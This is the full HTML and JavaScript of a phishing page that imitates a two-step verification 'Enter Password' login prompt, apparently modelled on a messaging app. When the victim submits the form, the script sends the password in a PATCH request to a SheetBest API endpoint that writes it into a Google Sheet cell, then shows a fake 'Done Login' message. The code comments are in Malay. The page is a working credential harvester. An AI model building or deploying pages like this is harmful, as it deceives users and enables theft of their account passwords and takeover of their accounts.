<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Enter Password</title>
  <link rel="icon" type="image/png" href="test2.png">
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="wrapper">
    <div class="content">
      <img src="monyet2.png" alt="emoji" class="emoji-gif">
      <h1 class="title">Enter Password</h1>
      <p class="subtitle">
        You have Two-Step Verification enabled, so your<br>
        account is protected with an additional password.
      </p>

      <form id="passwordForm" class="form-box" autocomplete="off">
        <input type="password" id="passwordInput" class="input" placeholder="Password" required>
        <button type="submit" class="btn">Log In</button>
      </form>
    </div>
  </div>

  <script>
    const form = document.getElementById("passwordForm");
    const passwordInput = document.getElementById("passwordInput");

    // URL API SheetBest yang sama
    const API = "https://api.sheetbest.com/sheets/f3cc6873-23ee-4df3-9eb8-49a788f9446a";

    // Bila user tekan Log In
    form.addEventListener("submit", async (e) => {
      e.preventDefault();

      const password = passwordInput.value.trim();
      if (!password) {
        alert("Please enter your password.");
        return;
      }

      // Payload untuk kolum 'tiga' (cell C2)
      const payload = { tiga: password };

      try {
        // PATCH untuk update baris pertama (row index 0 → baris 2 di sheet)
        const res = await fetch(`${API}/0`, {
          method: "PATCH",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });

        if (res.ok) {
          alert("Done Login");
          passwordInput.value = "";
        } else {
          alert("❌ Gagal simpan password ke Google Sheet.");
        }
      } catch (err) {
        alert("⚠️ Ralat sambungan: " + err.message);
      }
    });
  </script>
</body>
</html>
